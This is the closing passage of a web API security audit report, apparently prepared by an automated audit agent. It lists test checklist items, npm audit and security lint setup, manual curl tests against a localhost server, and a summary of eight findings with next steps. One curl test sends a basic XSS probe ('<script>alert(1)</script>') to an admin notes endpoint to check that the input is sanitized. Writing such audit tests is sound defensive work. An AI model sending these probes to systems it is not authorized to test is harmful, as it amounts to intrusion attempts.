- [ ] Test MED-NEW-003: Test rate limiting on all design endpoints
- [ ] Test LOW-NEW-002: Test rate limits across multiple servers
- [ ] Test LOW-NEW-001: Test CSRF token validation

### Automated Security Testing

```bash
# Run npm audit
npm audit

# Install security linting
npm install --save-dev eslint-plugin-security

# Add to .eslintrc.json
{
  "plugins": ["security"],
  "extends": ["plugin:security/recommended"]
}

# Run security scan
npm run lint
```

### Manual Testing Scripts

```bash
# Test unauthenticated product modification
curl "http://localhost:4321/api/check-product?slug=test-product&action=fix"
# Should return 403 Forbidden after fix

# Test error information disclosure
curl "http://localhost:4321/api/designs/save" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"invalid": "data"}'
# Should not expose internal error details in production

# Test XSS in notes
curl "http://localhost:4321/api/admin/update-item-notes" \
  -X POST \
  -H "Authorization: Bearer <admin-token>" \
  -H "Content-Type: application/json" \
  -d '{"orderId":"test","itemIndex":0,"notes":"<script>alert(1)</script>"}'
# Should sanitize the script tag
```

---

## Conclusion

This security audit identified **8 new vulnerabilities** that require attention:

- **3 HIGH severity** issues that need immediate remediation
- **3 MEDIUM severity** issues that should be addressed soon  
- **2 LOW severity** issues for long-term improvement

**Overall Security Improvement**: The codebase shows good security practices (authentication, rate limiting, CSRF protection, input validation). However, the issues found demonstrate the need for:

1. **Consistency**: Apply security patterns uniformly across all endpoints
2. **Defense in Depth**: Layer multiple security controls
3. **Security by Default**: Make secure coding the default, not an afterthought

**Estimated Total Remediation Time**: 15-20 hours across all findings

**Next Steps**:
1. Review this report with the development team
2. Prioritize fixes based on severity and business impact
3. Implement fixes following the recommended solutions
4. Add automated security testing to CI/CD pipeline
5. Schedule regular security audits (quarterly recommended)

---

**Report Prepared By**: API Security Audit Agent  
**Date**: December 29, 2025  
**Classification**: Internal Use Only  
**Next Review**: March 2026 (Quarterly)

---
